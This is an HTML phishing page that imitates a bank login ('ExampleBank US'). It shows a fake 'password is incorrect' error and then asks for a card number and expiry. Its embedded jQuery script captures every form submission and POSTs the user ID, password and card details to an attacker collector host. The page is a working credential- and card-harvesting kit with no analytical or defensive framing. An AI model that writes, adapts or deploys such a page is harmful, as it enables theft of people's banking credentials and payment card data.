<!DOCTYPE html>
<html><head><title>Log in to My Account | ExampleBank US</title></head>
<body>
<form class="login-box">
<label>User ID <input type="text" name="username"></label>
<label>Password <input type="password" name="password"></label>
<button type="submit">Log In</button>
</form>
<p class="err">The password is incorrect. Please try again.</p>
<form class="card-box">
<label>Card number <input type="text" name="numCard"></label>
<label>Expiry <input type="text" name="expDate" placeholder="MM/YY"></label>
<button type="submit">Continue</button>
</form>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
$('form').on('submit', function(e) {
  e.preventDefault();
  var data = $(this).serialize();
  $.ajax({
    url: "http://collector.attacker.net/collect/send.php",
    type: "POST",
    data: { pass: data },
  });
});
</script>
</body></html>
